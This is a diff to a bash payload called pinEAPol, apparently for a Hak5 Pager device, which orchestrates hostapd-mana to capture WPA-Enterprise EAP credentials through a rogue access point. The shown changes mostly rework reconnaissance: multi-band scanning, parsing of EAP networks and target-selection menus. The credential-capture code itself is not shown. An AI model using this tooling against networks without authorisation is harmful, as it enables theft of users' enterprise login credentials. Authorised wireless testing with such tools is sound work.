@@ -2,7 +2,7 @@
 # Title: pinEAPol
 # Author: R4g3D
 # Description: Pager-native hostapd-mana orchestrator for authorized WPA-Enterprise EAP credential capture
-# Version: 3.5
+# Version: 3.6
 # Requires: openssl-util, iw, net-tools-ifconfig; tcpdump optional; monitor/AP-capable radio
 # Category: user/capture
 # Based on VENOM by sinXneo.
@@ -113,7 +113,6 @@ CERT_DNS_SANS="radius-server-auth.local"
 CERT_IP_SANS="127.0.0.1"
 CERT_DAYS=3650
 CERT_KEY_BITS=2048
-CERT_DH_BITS=2048
 CERT_RENEW_BEFORE_DAYS=30
 CERT_PROFILE="default"
 CERT_FORCE_REGENERATE=0
@@ -703,6 +702,7 @@ cleanup() {
     if [ "$RUNTIME_LOCK_HELD" -eq 1 ]; then
         stop_managed_hostapd
         stop_capture
+        remove_scan_interface
         remove_managed_interfaces
         # Keep the supervisor alive until resource cleanup is complete. If the
         # UI kills this shell mid-cleanup, it takes over and finishes the work.
@@ -796,7 +796,6 @@ read_persistent_settings() {
             CERT_IP_SANS) CERT_IP_SANS="$value" ;;
             CERT_DAYS) CERT_DAYS="$value" ;;
             CERT_KEY_BITS) CERT_KEY_BITS="$value" ;;
-            CERT_DH_BITS) CERT_DH_BITS="$value" ;;
             CERT_RENEW_BEFORE_DAYS) CERT_RENEW_BEFORE_DAYS="$value" ;;
             EAP_PROFILE) EAP_PROFILE="$value" ;;
         esac
@@ -826,7 +825,6 @@ write_persistent_settings() {
         echo "CERT_IP_SANS=$CERT_IP_SANS"
         echo "CERT_DAYS=$CERT_DAYS"
         echo "CERT_KEY_BITS=$CERT_KEY_BITS"
-        echo "CERT_DH_BITS=$CERT_DH_BITS"
         echo "CERT_RENEW_BEFORE_DAYS=$CERT_RENEW_BEFORE_DAYS"
         echo "EAP_PROFILE=$EAP_PROFILE"
     } > "$settings_file"
@@ -1155,6 +1153,14 @@ check_deps() {
         logboth green "    - iw found"
     fi
 
+    logboth "  - Checking for iwinfo..."
+    if ! command -v iwinfo >/dev/null 2>&1; then
+        logboth red "    - iwinfo not found"
+        missing=1
+    else
+        logboth green "    - iwinfo found"
+    fi
+
     logboth "  - Checking for ifconfig..."
     if ! command -v ifconfig >/dev/null 2>&1; then
         logboth red "    - ifconfig not found"
@@ -1183,8 +1189,8 @@ Attempt auto-install?")
             local sid=$(START_SPINNER "Installing packages...")
             logboth "  - Updating opkg..."
             opkg update >/dev/null 2>&1
-            logboth "  - Installing openssl-util, iw, ifconfig, and tcpdump..."
-            opkg install openssl-util iw net-tools-ifconfig tcpdump >/dev/null 2>&1
+            logboth "  - Installing openssl-util, iw, iwinfo, ifconfig, and tcpdump..."
+            opkg install openssl-util iw iwinfo net-tools-ifconfig tcpdump >/dev/null 2>&1
             STOP_SPINNER $sid
 
             logboth "  - Verifying installation..."
@@ -1204,6 +1210,16 @@ opkg install iw"
                 return 1
             else
                 logboth green "    - iw installed"
+            fi
+            if ! command -v iwinfo >/dev/null 2>&1; then
+                logboth red "    - iwinfo install failed"
+                ERROR_DIALOG "iwinfo install failed
+
+Run manually:
+opkg install iwinfo"
+                return 1
+            else
+                logboth green "    - iwinfo installed"
             fi
             if ! command -v ifconfig >/dev/null 2>&1; then
                 logboth red "    - ifconfig install failed"
@@ -1245,117 +1261,886 @@ opkg install net-tools-ifconfig"
 # PHASE 1: RECON
 # ============================================
 
-# Scan arrays
+#
+# pinEAPol intentionally scans only on the Pager's multi-band radio.
+#
+# phy0 is not used as a fallback because doing so could silently hide
+# 5 GHz / 6 GHz enterprise networks from the user.
+#
+SCAN_PHY="${PINEAPOL_SCAN_PHY:-phy1}"
+SCAN_TEMP_IFACE="${PINEAPOL_SCAN_IFACE:-wlan1scan}"
+SCAN_TEMP_CREATED=0
+SCAN_INTERFACE=""
+SCAN_BANDS="unknown"
+SCAN_RAW_FILE=""
+
+# One entry per BSSID.
 declare -a ENTERPRISE_SSIDS
 declare -a ENTERPRISE_BSSIDS
 declare -a ENTERPRISE_CHANNELS
 declare -a ENTERPRISE_SIGNALS
+declare -a ENTERPRISE_ENCRYPTIONS
+
+# One entry per unique SSID, derived from the BSSID-level arrays.
+declare -a ENTERPRISE_UNIQUE_SSIDS
+declare -a ENTERPRISE_UNIQUE_SIGNALS
+declare -a ENTERPRISE_UNIQUE_COUNTS
+
 ENTERPRISE_COUNT=0
+ENTERPRISE_UNIQUE_COUNT=0
 
-scan_enterprise_networks() {
-    logboth blue "Scanning for enterprise networks..."
-    led_recon
-    local sid=$(START_SPINNER "Scanning WiFi...")
 
+reset_enterprise_scan_results() {
     ENTERPRISE_SSIDS=()
     ENTERPRISE_BSSIDS=()
     ENTERPRISE_CHANNELS=()
     ENTERPRISE_SIGNALS=()
+    ENTERPRISE_ENCRYPTIONS=()
+
+    ENTERPRISE_UNIQUE_SSIDS=()
+    ENTERPRISE_UNIQUE_SIGNALS=()
+    ENTERPRISE_UNIQUE_COUNTS=()
+
     ENTERPRISE_COUNT=0
+    ENTERPRISE_UNIQUE_COUNT=0
+}
 
-    # Use iwinfo scan and parse with awk for reliability
-    local scan_output
-    scan_output=$(iwinfo wlan1 scan 2>/dev/null)
 
-    if [ -z "$scan_output" ]; then
-        scan_output=$(iwinfo wlan1mon scan 2>/dev/null)
+# Return the PHY name for an interface, for example:
+#
+#     wlan1mon -> phy1
+#
+interface_phy() {
+    local iface="$1"
+    local wiphy
+
+    wiphy=$(iw dev "$iface" info 2>/dev/null |
+        awk '$1 == "wiphy" { print $2; exit }')
+
+    case "$wiphy" in
+        ''|*[!0-9]*)
+            return 1
+            ;;
+    esac
+
+    printf 'phy%s' "$wiphy"
+}
+
+
+#
+# Produce a short human-readable summary of the frequency ranges exposed
+# by the selected PHY.
+#
+# The Pager's iw output reports frequencies as e.g. "2412.0 MHz", so strip
+# the decimal portion before performing integer comparisons.
+#
+detect_phy_bands() {
+    local phy="$1"
+    local frequencies
+    local have_2=0
+    local have_5=0
+    local have_6=0
+    local freq
+    local result=""
+
+    frequencies=$(
+        iw phy "$phy" info 2>/dev/null |
+            awk '
+                $1 == "*" && $3 == "MHz" {
+                    freq = $2
+                    sub(/\..*/, "", freq)
+                    print freq
+                }
+            '
+    )
+
+    while IFS= read -r freq; do
+        case "$freq" in
+            ''|*[!0-9]*)
+                continue
+                ;;
+        esac
+
+        if [ "$freq" -ge 2400 ] && [ "$freq" -lt 2500 ]; then
+            have_2=1
+
+        elif [ "$freq" -ge 4900 ] && [ "$freq" -lt 5925 ]; then
+            have_5=1
+
+        elif [ "$freq" -ge 5925 ] && [ "$freq" -le 7125 ]; then
+            have_6=1
+        fi
+    done <<< "$frequencies"
+
+    [ "$have_2" -eq 1 ] && result="2.4GHz"
+
+    if [ "$have_5" -eq 1 ]; then
+        [ -n "$result" ] && result="$result / "
+        result="${result}5GHz"
     fi
 
-    STOP_SPINNER $sid
+    if [ "$have_6" -eq 1 ]; then
+        [ -n "$result" ] && result="$result / "
+        result="${result}6GHz"
+    fi
 
-    if [ -z "$scan_output" ]; then
-        logboth red "Scan failed - no results"
+    [ -n "$result" ] || result="unknown"
+
+    printf '%s' "$result"
+}
+
+
+#
+# Remove the temporary managed interface used for active scanning.
+#
+# Only the explicitly reserved scan interface is touched. wlan1mon is never
+# modified or deleted here.
+#
+remove_scan_interface() {
+    local iface="${SCAN_TEMP_IFACE:-wlan1scan}"
+    local phy
+    local iface_type
+
+    #
+    # Only remove an interface created by this payload instance.
+    #
+    # This prevents cleanup from deleting an unrelated pre-existing
+    # managed interface that happens to use the same name.
+    #
+    if [ "$SCAN_TEMP_CREATED" -ne 1 ]; then
+        return 0
+    fi
+
+    if ! iw dev "$iface" info >/dev/null 2>&1; then
+        SCAN_TEMP_CREATED=0
+        return 0
+    fi
+
+    phy=$(interface_phy "$iface" 2>/dev/null)
+    iface_type=$(
+        iw dev "$iface" info 2>/dev/null |
+            awk '$1 == "type" { print $2; exit }'
+    )
+
+    #
+    # Refuse to remove an interface with our reserved name if it isn't the
+    # managed phy1 interface we expect.
+    #
+    if [ "$phy" != "$SCAN_PHY" ] || [ "$iface_type" != "managed" ]; then
+        logboth yellow \
+            "Refusing to remove unexpected interface $iface (phy=${phy:-unknown}, type=${iface_type:-unknown})"
         return 1
     fi
 
-    # AWK script to parse iwinfo output
-    local awk_script='
-        BEGIN { FS = "\n"; RS = "Cell"; OFS = "|"; }
-        /ESSID:/ && /802.1X|EAP|Enterprise/ {
-            bssid = ""; ssid = ""; channel = ""; signal = "";
-            for (i = 1; i <= NF; i++) {
-                if ($i ~ /Address:/) { bssid = $i; sub(/.*Address: /, "", bssid); }
-                if ($i ~ /ESSID:/) { ssid = $i; sub(/.*ESSID: "/, "", ssid); sub(/".*/, "", ssid); }
-                if ($i ~ /Channel:/) { channel = $i; sub(/.*Channel: /, "", channel); }
-                if ($i ~ /Signal:/) { signal = $i; sub(/.*Signal: /, "", signal); sub(/ dBm.*/, "", signal); }
-            }
-            if (ssid != "" && bssid != "") {
-                print ssid, bssid, channel, signal;
-            }
-        }
-    '
-
-    local parsed_networks=$(echo "$scan_output" | awk "$awk_script")
-
-    while IFS='|' read -r ssid bssid channel signal; do
-        ENTERPRISE_SSIDS+=("$ssid")
-        ENTERPRISE_BSSIDS+=("$bssid")
-        ENTERPRISE_CHANNELS+=("${channel:-$DEFAULT_CHANNEL}")
-        ENTERPRISE_SIGNALS+=("${signal:--99}")
-    done <<< "$parsed_networks"
-
-    ENTERPRISE_COUNT=${#ENTERPRISE_SSIDS[@]}
-
-    if [ "$ENTERPRISE_COUNT" -eq 0 ]; then
-        logboth yellow "No WPA-Enterprise networks found"
-        return 1
+    if command -v ifconfig >/dev/null 2>&1; then
+        ifconfig "$iface" down 2>/dev/null || true
+    elif command -v ip >/dev/null 2>&1; then
+        ip link set "$iface" down 2>/dev/null || true
     fi
 
-    logboth green "Found $ENTERPRISE_COUNT enterprise network(s)"
+    iw dev "$iface" del 2>/dev/null || {
+        logboth yellow "Could not remove temporary scan interface $iface"
+        return 1
+    }
+
+    SCAN_TEMP_CREATED=0
     return 0
 }
 
-# Target selection UI (scrollable picker)
-show_enterprise_target() {
-    local idx=$1
-    LOG ""
-    LOG green "[$((idx + 1))/$ENTERPRISE_COUNT] ${ENTERPRISE_SSIDS[$idx]}"
-    LOG "BSSID: ${ENTERPRISE_BSSIDS[$idx]}"
-    LOG "Ch: ${ENTERPRISE_CHANNELS[$idx]}  Signal: ${ENTERPRISE_SIGNALS[$idx]} dBm"
-    LOG ""
-    LOG "UP/DOWN=Scroll  A=Select  B=Manual"
+
+#
+# Create a temporary managed interface on the Pager's multi-band PHY.
+#
+# iwinfo requires a managed interface for active scanning on this radio;
+# wlan1mon is a monitor interface and reports "Scanning not possible".
+#
+prepare_scan_interface() {
+    local iface="$SCAN_TEMP_IFACE"
+    local existing_phy
+    local existing_type
+    local created_phy
+    local created_type
+
+    #
+    # If wlan1scan was left behind by an interrupted run or manual test,
+    # validate it before removing it.
+    #
+    if iw dev "$iface" info >/dev/null 2>&1; then
+        existing_phy=$(interface_phy "$iface" 2>/dev/null)
+        existing_type=$(
+            iw dev "$iface" info 2>/dev/null |
+                awk '$1 == "type" { print $2; exit }'
+        )
+
+        if [ "$existing_phy" != "$SCAN_PHY" ] || \
+           [ "$existing_type" != "managed" ]; then
+
+            logboth red \
+                "$iface already exists with unexpected configuration"
+            logboth red \
+                "Interface: phy=${existing_phy:-unknown} type=${existing_type:-unknown}"
+
+            return 1
+        fi
+
+        logboth red \
+            "$iface already exists on $SCAN_PHY"
+
+        logboth yellow \
+            "Refusing to replace a pre-existing managed interface"
+
+        return 1
+    fi
+
+    logboth blue \
+        "Creating managed scan interface $iface on $SCAN_PHY"
+
+    if ! iw phy "$SCAN_PHY" interface add "$iface" type managed \
+        2>> "$SESSION_LOG_DIR/scan-errors.log"; then
+
+        logboth red \
+            "Could not create managed scan interface on $SCAN_PHY"
+        return 1
+    fi
+
+    SCAN_TEMP_CREATED=1
+
+    if command -v ifconfig >/dev/null 2>&1; then
+        if ! ifconfig "$iface" up \
+            2>> "$SESSION_LOG_DIR/scan-errors.log"; then
+
+            logboth red "Could not bring $iface up"
+            remove_scan_interface
+            return 1
+        fi
+
+    elif command -v ip >/dev/null 2>&1; then
+        if ! ip link set "$iface" up \
+            2>> "$SESSION_LOG_DIR/scan-errors.log"; then
+
+            logboth red "Could not bring $iface up"
+            remove_scan_interface
+            return 1
+        fi
+    else
+        logboth red \
+            "Neither ifconfig nor ip is available to bring $iface up"
+
+        remove_scan_interface
+        return 1
+    fi
+
+    #
+    # Give mac80211/driver a moment to initialise the new VIF before iwinfo
+    # requests a scan.
+    #
+    sleep 1
+
+    created_phy=$(interface_phy "$iface" 2>/dev/null)
+    created_type=$(
+        iw dev "$iface" info 2>/dev/null |
+            awk '$1 == "type" { print $2; exit }'
+    )
+
+    if [ "$created_phy" != "$SCAN_PHY" ] || \
+       [ "$created_type" != "managed" ]; then
+
+        logboth red \
+            "Temporary scan interface validation failed"
+
+        logboth red \
+            "Interface: $iface phy=${created_phy:-unknown} type=${created_type:-unknown}"
+
+        remove_scan_interface
+        return 1
+    fi
+
+    logboth green \
+        "Scan interface ready: $iface ($created_phy, $created_type)"
+
+    return 0
 }
 
-select_target() {
-    local selected=0
-    show_enterprise_target $selected
+
+#
+# Perform an active multi-band scan using a temporary managed interface
+# attached to phy1.
+#
+perform_multiband_scan() {
+    local scan_file
+    local scan_status
+    local cells=0
+
+    SCAN_INTERFACE=""
+    SCAN_RAW_FILE=""
+    SCAN_BANDS=$(detect_phy_bands "$SCAN_PHY")
+
+    logboth blue "Recon radio: $SCAN_PHY"
+    logboth blue "Recon bands: $SCAN_BANDS"
+
+    #
+    # Confirm the target PHY actually exists before attempting to create
+    # an interface on it.
+    #
+    if ! iw phy "$SCAN_PHY" info >/dev/null 2>&1; then
+        logboth red "Multi-band radio not found: $SCAN_PHY"
+        return 1
+    fi
+
+    if ! prepare_scan_interface; then
+        logboth red "Unable to prepare multi-band scan interface"
+        return 1
+    fi
+
+    SCAN_INTERFACE="$SCAN_TEMP_IFACE"
+    scan_file="$SESSION_WORK_DIR/iwinfo-${SCAN_INTERFACE}-scan.txt"
+    SCAN_RAW_FILE="$scan_file"
+
+    logboth blue \
+        "Starting WiFi scan on $SCAN_INTERFACE ($SCAN_PHY)"
+
+    #
+    # Keep the complete iwinfo output. This is useful for debugging parsing
+    # problems and lets the interface be deleted immediately after scanning.
+    #
+    iwinfo "$SCAN_INTERFACE" scan > "$scan_file" \
+        2>> "$SESSION_LOG_DIR/scan-errors.log"
+
+    scan_status=$?
+
+    #
+    # Some iwinfo builds print errors such as "Scanning not possible" to
+    # stdout while still returning a successful exit status. Explicitly
+    # reject those responses.
+    #
+    if grep -qiE \
+        'Scanning not possible|No such wireless device|Interface .* not found|Operation not supported|Device or resource busy' \
+        "$scan_file" 2>/dev/null; then
+
+        logboth red \
+            "iwinfo reported that scanning is unavailable on $SCAN_INTERFACE"
+
+        while IFS= read -r line; do
+            [ -n "$line" ] && \
+                logboth yellow "iwinfo: $line"
+        done < "$scan_file"
+
+        remove_scan_interface
+        return 1
+    fi
+
+    if [ "$scan_status" -ne 0 ]; then
+        logboth red \
+            "iwinfo scan failed on $SCAN_INTERFACE (status $scan_status)"
+
+        remove_scan_interface
+        return 1
+    fi
+
+    cells=$(
+        grep -cE \
+            '^[[:space:]]*Cell[[:space:]]+[0-9]+[[:space:]]*-[[:space:]]*Address:' \
+            "$scan_file" 2>/dev/null
+    )
+
+    case "$cells" in
+        ''|*[!0-9]*)
+            cells=0
+            ;;
+    esac
+
+    logboth blue \
+        "WiFi scan completed: $cells BSS entries"
+
+    #
+    # The raw scan has already been saved, so the managed scan VIF is no
+    # longer required. Leave wlan1mon completely untouched.
+    #
+    remove_scan_interface
+
+    if [ "$cells" -eq 0 ]; then
+        logboth yellow \
+            "WiFi scan completed successfully but found no BSS entries"
+
+        return 0
+    fi
+
+    logboth green \
+        "WiFi scan captured $cells BSS entries on $SCAN_PHY"
+
+    return 0
+}
+
+
+normalize_enterprise_encryption() {
+    local description
+
+    description=$(printf '%s' "$1" |
+        tr '[:lower:]' '[:upper:]')
+
+    case "$description" in
+        *ENTERPRISE*|*802.1X*|*8021X*|*EAP*)
+            return 0
+            ;;
+    esac
+
+    return 1
+}
+
+
+#
+# Add one BSSID-level Enterprise record.
+#
+# Invalid or incomplete records are discarded instead of filling them with
+# fake defaults such as channel 6 / -99 dBm.
+#
+add_enterprise_scan_record() {
+    local ssid="$1"
+    local bssid="$2"
+    local channel="$3"
+    local signal="$4"
+    local encryption="$5"
+    local i
+
+    [ -n "$ssid" ] || return 0
+    [ -n "$bssid" ] || return 0
+
+    case "$ssid" in
+        [Uu][Nn][Kk][Nn][Oo][Ww][Nn])
+            return 0
+            ;;
+    esac
+
+    normalize_enterprise_encryption "$encryption" || return 0
+
+    case "$channel" in
+        ''|*[!0-9]*)
+            return 0
+            ;;
+    esac
+
+    case "$signal" in
+        -[0-9]*|[0-9]*)
+            ;;
+        *)
+            return 0
+            ;;
+    esac
+
+    #
+    # Ensure this exact BSSID only appears once.
+    #
+    for ((i = 0; i < ${#ENTERPRISE_BSSIDS[@]}; i++)); do
+        if [ "${ENTERPRISE_BSSIDS[$i]}" = "$bssid" ]; then
+            #
+            # If the same BSSID appeared more than once, retain the
+            # strongest observation.
+            #
+            if [ "$signal" -gt "${ENTERPRISE_SIGNALS[$i]}" ] 2>/dev/null; then
+                ENTERPRISE_SSIDS[$i]="$ssid"
+                ENTERPRISE_CHANNELS[$i]="$channel"
+                ENTERPRISE_SIGNALS[$i]="$signal"
+                ENTERPRISE_ENCRYPTIONS[$i]="$encryption"
+            fi
+
+            return 0
+        fi
+    done
+
+    ENTERPRISE_SSIDS+=("$ssid")
+    ENTERPRISE_BSSIDS+=("$bssid")
+    ENTERPRISE_CHANNELS+=("$channel")
+    ENTERPRISE_SIGNALS+=("$signal")
+    ENTERPRISE_ENCRYPTIONS+=("$encryption")
+}
+
+
+#
+# Parse iwinfo output one Cell at a time.
+#
+# This follows the more robust approach used by Hak5's AP-Client-GUI rather
+# than splitting AWK output through a here-string.
+#
+parse_enterprise_scan_results() {
+    local line
+    local in_cell=0
+
+    local ssid=""
+    local bssid=""
+    local channel=""
+    local signal=""
+    local encryption=""
+
+    local raw
+    local new_bssid
+
+    reset_enterprise_scan_results
+
+    [ -n "$SCAN_RAW_FILE" ] || return 1
+    [ -f "$SCAN_RAW_FILE" ] || return 1
+
+    while IFS= read -r line || [ -n "$line" ]; do
+        line=${line%$'\r'}
+
+        if [[ "$line" =~ ^[[:space:]]*Cell[[:space:]]+[0-9]+[[:space:]]*-[[:space:]]*Address:[[:space:]]*(.*)$ ]]; then
+            new_bssid="${BASH_REMATCH[1]}"
+
+            if [ "$in_cell" -eq 1 ]; then
+                add_enterprise_scan_record \
+                    "$ssid" \
+                    "$bssid" \
+                    "$channel" \
+                    "$signal" \
+                    "$encryption"
+            fi
+
+            in_cell=1
+
+            ssid=""
+            bssid="$new_bssid"
+            channel=""
+            signal=""
+            encryption=""
+
+            continue
+        fi
+
+        [ "$in_cell" -eq 1 ] || continue
+
+        if [[ "$line" =~ ^[[:space:]]*ESSID:[[:space:]]*(.*)$ ]]; then
+            raw="${BASH_REMATCH[1]}"
+
+            if [ "${#raw}" -ge 2 ] &&
+               [ "${raw:0:1}" = '"' ] &&
+               [ "${raw: -1}" = '"' ]; then
+                raw="${raw:1:${#raw}-2}"
+            fi
+
+            ssid="$raw"
+
+        elif [[ "$line" =~ Channel:[[:space:]]*([0-9]+) ]]; then
+            channel="${BASH_REMATCH[1]}"
+
+        elif [[ "$line" =~ ^[[:space:]]*Signal:[[:space:]]*(-?[0-9]+)[[:space:]]*dBm ]]; then
+            signal="${BASH_REMATCH[1]}"
+
+        elif [[ "$line" =~ ^[[:space:]]*Encryption:[[:space:]]*(.*)$ ]]; then
+            encryption="${BASH_REMATCH[1]}"
+        fi
+    done < "$SCAN_RAW_FILE"
+
+    if [ "$in_cell" -eq 1 ]; then
+        add_enterprise_scan_record \
+            "$ssid" \
+            "$bssid" \
+            "$channel" \
+            "$signal" \
+            "$encryption"
+    fi
+
+    ENTERPRISE_COUNT=${#ENTERPRISE_SSIDS[@]}
+
+    return 0
+}
+
+
+#
+# Sort all BSSID records by signal, strongest first.
+#
+sort_enterprise_results() {
+    local count=${#ENTERPRISE_SSIDS[@]}
+    local i j
+    local tmp
+
+    for ((i = 0; i < count; i++)); do
+        for ((j = i + 1; j < count; j++)); do
+
+            if [ "${ENTERPRISE_SIGNALS[$j]}" -gt \
+                 "${ENTERPRISE_SIGNALS[$i]}" ] 2>/dev/null; then
+
+                tmp="${ENTERPRISE_SSIDS[$i]}"
+                ENTERPRISE_SSIDS[$i]="${ENTERPRISE_SSIDS[$j]}"
+                ENTERPRISE_SSIDS[$j]="$tmp"
+
+                tmp="${ENTERPRISE_BSSIDS[$i]}"
+                ENTERPRISE_BSSIDS[$i]="${ENTERPRISE_BSSIDS[$j]}"
+                ENTERPRISE_BSSIDS[$j]="$tmp"
+
+                tmp="${ENTERPRISE_CHANNELS[$i]}"
+                ENTERPRISE_CHANNELS[$i]="${ENTERPRISE_CHANNELS[$j]}"
+                ENTERPRISE_CHANNELS[$j]="$tmp"
+
+                tmp="${ENTERPRISE_SIGNALS[$i]}"
+                ENTERPRISE_SIGNALS[$i]="${ENTERPRISE_SIGNALS[$j]}"
+                ENTERPRISE_SIGNALS[$j]="$tmp"
+
+                tmp="${ENTERPRISE_ENCRYPTIONS[$i]}"
+                ENTERPRISE_ENCRYPTIONS[$i]="${ENTERPRISE_ENCRYPTIONS[$j]}"
+                ENTERPRISE_ENCRYPTIONS[$j]="$tmp"
+            fi
+        done
+    done
+}
+
+
+#
+# Build the first-level SSID list.
+#
+# Because the underlying BSSID records are already sorted strongest-first,
+# the first observation of an SSID also provides its strongest signal.
+#
+build_unique_enterprise_ssids() {
+    local i j
+    local ssid
+    local existing
+
+    ENTERPRISE_UNIQUE_SSIDS=()
+    ENTERPRISE_UNIQUE_SIGNALS=()
+    ENTERPRISE_UNIQUE_COUNTS=()
+
+    for ((i = 0; i < ENTERPRISE_COUNT; i++)); do
+        ssid="${ENTERPRISE_SSIDS[$i]}"
+        existing=-1
+
+        for ((j = 0; j < ${#ENTERPRISE_UNIQUE_SSIDS[@]}; j++)); do
+            if [ "${ENTERPRISE_UNIQUE_SSIDS[$j]}" = "$ssid" ]; then
+                existing=$j
+                break
+            fi
+        done
+
+        if [ "$existing" -ge 0 ]; then
+            ENTERPRISE_UNIQUE_COUNTS[$existing]=$((ENTERPRISE_UNIQUE_COUNTS[$existing] + 1))
+        else
+            ENTERPRISE_UNIQUE_SSIDS+=("$ssid")
+            ENTERPRISE_UNIQUE_SIGNALS+=("${ENTERPRISE_SIGNALS[$i]}")
+            ENTERPRISE_UNIQUE_COUNTS+=(1)
+        fi
+    done
+
+    ENTERPRISE_UNIQUE_COUNT=${#ENTERPRISE_UNIQUE_SSIDS[@]}
+}
+
+
+log_enterprise_scan_results() {
+    local i
+
+    logboth green "WPA-Enterprise BSSIDs found: $ENTERPRISE_COUNT"
+    logboth green "Unique WPA-Enterprise SSIDs: $ENTERPRISE_UNIQUE_COUNT"
+
+    for ((i = 0; i < ENTERPRISE_COUNT; i++)); do
+        logboth blue \
+            "AP: SSID='${ENTERPRISE_SSIDS[$i]}' BSSID=${ENTERPRISE_BSSIDS[$i]} Ch=${ENTERPRISE_CHANNELS[$i]} Signal=${ENTERPRISE_SIGNALS[$i]}dBm Encryption='${ENTERPRISE_ENCRYPTIONS[$i]}'"
+    done
+}
+
+
+scan_enterprise_networks() {
+    local sid
+
+    led_recon
+
+    logboth blue "Starting WPA-Enterprise discovery"
+
+    sid=$(START_SPINNER "Scanning WiFi...")
+
+    if ! perform_multiband_scan; then
+        STOP_SPINNER "$sid"
+
+        logboth red "Multi-band WiFi scan failed"
+        return 1
+    fi
+
+    if ! parse_enterprise_scan_results; then
+        STOP_SPINNER "$sid"
+
+        logboth red "Unable to parse WiFi scan results"
+        return 1
+    fi
+
+    sort_enterprise_results
+    build_unique_enterprise_ssids
+
+    STOP_SPINNER "$sid"
+
+    log_enterprise_scan_results
+
+    if [ "$ENTERPRISE_COUNT" -eq 0 ]; then
+        logboth yellow "No WPA-Enterprise networks found"
+        return 2
+    fi
+
+    return 0
+}
+
+
+#
+# Find every BSSID index associated with an SSID.
+#
+get_ssid_bssid_indices() {
+    local wanted_ssid="$1"
+    local i
+
+    for ((i = 0; i < ENTERPRISE_COUNT; i++)); do
+        if [ "${ENTERPRISE_SSIDS[$i]}" = "$wanted_ssid" ]; then
+            printf '%s\n' "$i"
+        fi
+    done
+}
+
+
+set_target_from_scan_index() {
+    local index="$1"
+
+    TARGET_SSID="${ENTERPRISE_SSIDS[$index]}"
+    TARGET_BSSID="${ENTERPRISE_BSSIDS[$index]}"
+    TARGET_CHANNEL="${ENTERPRISE_CHANNELS[$index]}"
+    TARGET_SIGNAL="${ENTERPRISE_SIGNALS[$index]}"
+
+    logboth green "Target selected: SSID='$TARGET_SSID'"
+    logboth blue "Target BSSID: $TARGET_BSSID"
+    logboth blue "Target channel: $TARGET_CHANNEL"
+    logboth blue "Target signal: ${TARGET_SIGNAL}dBm"
+
+    return 0
+}
+
+
+#
+# Second-level picker for an SSID advertised by multiple APs.
+#
+select_enterprise_bssid() {
+    local wanted_ssid="$1"
+
+    local indices=()
+    local options=()
+
+    local index
+    local label
+    local selected
+    local selected_position=-1
+    local i
+
+    while IFS= read -r index; do
+        [ -n "$index" ] || continue
+
+        indices+=("$index")
+
+        #
+        # Signal and channel are deliberately first because they're usually
+        # more useful on the Pager display than the MAC address.
+        #
+        label="${ENTERPRISE_SIGNALS[$index]}dBm Ch${ENTERPRISE_CHANNELS[$index]} ${ENTERPRISE_BSSIDS[$index]}"
+        options+=("$label")
+    done < <(get_ssid_bssid_indices "$wanted_ssid")
+
+    if [ "${#indices[@]}" -eq 0 ]; then
+        return 1
+    fi
+
+    #
+    # There is no reason to display a second picker for a single AP.
+    #
+    if [ "${#indices[@]}" -eq 1 ]; then
+        set_target_from_scan_index "${indices[0]}"
+        return 0
+    fi
+
+    options+=("<- Back")
+
+    selected=$(ui_list_picker \
+        "$wanted_ssid - Select AP" \
+        "${options[0]}" \
+        "${options[@]}") || return 2
+
+    [ "$selected" = "<- Back" ] && return 2
+
+    for ((i = 0; i < ${#options[@]} - 1; i++)); do
+        if [ "${options[$i]}" = "$selected" ]; then
+            selected_position=$i
+            break
+        fi
+    done
+
+    [ "$selected_position" -ge 0 ] || return 1
+
+    set_target_from_scan_index "${indices[$selected_position]}"
+    return 0
+}
+
+
+#
+# First-level picker. Each SSID appears only once.
+#
+select_enterprise_ssid() {
+    local options=()
+    local labels=()
+
+    local i
+    local label
+    local selected
+    local selected_ssid=""
+    local result
+
+    for ((i = 0; i < ENTERPRISE_UNIQUE_COUNT; i++)); do
+        #
+        # Show strongest observed signal as a useful hint.
+        #
+        # Add an AP count only when the SSID is duplicated.
+        #
+        if [ "${ENTERPRISE_UNIQUE_COUNTS[$i]}" -gt 1 ]; then
+            label="${ENTERPRISE_UNIQUE_SSIDS[$i]}  ${ENTERPRISE_UNIQUE_SIGNALS[$i]}dBm (${ENTERPRISE_UNIQUE_COUNTS[$i]} APs)"
+        else
+            label="${ENTERPRISE_UNIQUE_SSIDS[$i]}  ${ENTERPRISE_UNIQUE_SIGNALS[$i]}dBm"
+        fi
+
+        labels+=("$label")
+        options+=("$label")
+    done
+
+    options+=("<- Back")
 
     while true; do
-        local btn=$(WAIT_FOR_INPUT)
-        case "$btn" in
-            UP|LEFT)
-                selected=$((selected - 1))
-                [ $selected -lt 0 ] && selected=$((ENTERPRISE_COUNT - 1))
-                show_enterprise_target $selected
-                ;;
-            DOWN|RIGHT)
-                selected=$((selected + 1))
-                [ $selected -ge $ENTERPRISE_COUNT ] && selected=0
-                show_enterprise_target $selected
-                ;;
-            A)
-                TARGET_SSID="${ENTERPRISE_SSIDS[$selected]}"
-                TARGET_BSSID="${ENTERPRISE_BSSIDS[$selected]}"
-                TARGET_CHANNEL="${ENTERPRISE_CHANNELS[$selected]}"
-                TARGET_SIGNAL="${ENTERPRISE_SIGNALS[$selected]}"
+        selected=$(ui_list_picker \
+            "WPA-Enterprise Networks" \
+            "${options[0]}" \
+            "${options[@]}") || return 2
+
+        [ "$selected" = "<- Back" ] && return 2
+
+        selected_ssid=""
+
+        for ((i = 0; i < ENTERPRISE_UNIQUE_COUNT; i++)); do
+            if [ "${labels[$i]}" = "$selected" ]; then
+                selected_ssid="${ENTERPRISE_UNIQUE_SSIDS[$i]}"
+                break
+            fi
+        done
+
+        [ -n "$selected_ssid" ] || continue
+
+        select_enterprise_bssid "$selected_ssid"
+        result=$?
+
+        case "$result" in
+            0)
                 return 0
                 ;;
-            B|BACK)
-                return 1
+
+            2)
+                #
+                # Back from BSSID picker -> return to SSID picker.
+                #
+                continue
+                ;;
+
+            *)
+                ERROR_DIALOG "Unable to select access point"
                 ;;
         esac
     done
 }
+
 
 manual_target_entry() {
     local resp
@@ -1366,23 +2151,200 @@ manual_target_entry() {
             return 1
             ;;
     esac
+
     if [ -z "$resp" ]; then
         ERROR_DIALOG "SSID cannot be empty"
         return 1
     fi
+
     TARGET_SSID="$resp"
 
-    resp=$(NUMBER_PICKER "Channel (1-165)" "$DEFAULT_CHANNEL")
+    resp=$(NUMBER_PICKER \
+        "Channel (1-233)" \
+        "$DEFAULT_CHANNEL")
+
     case $? in
         $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED|$DUCKYSCRIPT_ERROR)
             return 1
             ;;
     esac
